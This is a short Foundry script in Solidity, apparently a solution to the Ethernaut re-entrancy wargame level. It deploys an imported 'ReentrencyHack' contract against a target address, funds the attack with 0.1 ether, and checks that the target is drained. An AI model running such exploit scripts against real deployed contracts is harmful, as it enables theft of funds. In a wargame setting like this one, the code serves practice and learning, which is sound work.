pragma solidity ^0.8.17;
import "forge-std/Script.sol";
import "../src/Reentrency/Reentrency.sol";
import "../src/Reentrency/ReentrencyHack.sol";

contract ReentrencyScript is Script {
    function run() public {
        address reentrencyAddress = vm.envAddress("REENTRENCY_ADDRESS");
        Reentrency ethernautReentrency = Reentrency(payable(reentrencyAddress));

        uint256 deployerKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployerKey);

        ReentrencyHack reentrencyHack = new ReentrencyHack(address(ethernautReentrency));
        reentrencyHack.hack{value: 0.1 ether}();

        require(address(ethernautReentrency).balance == 0, "contract not drained");

        vm.stopBroadcast();
        console.log("SUCCESS");
    }
}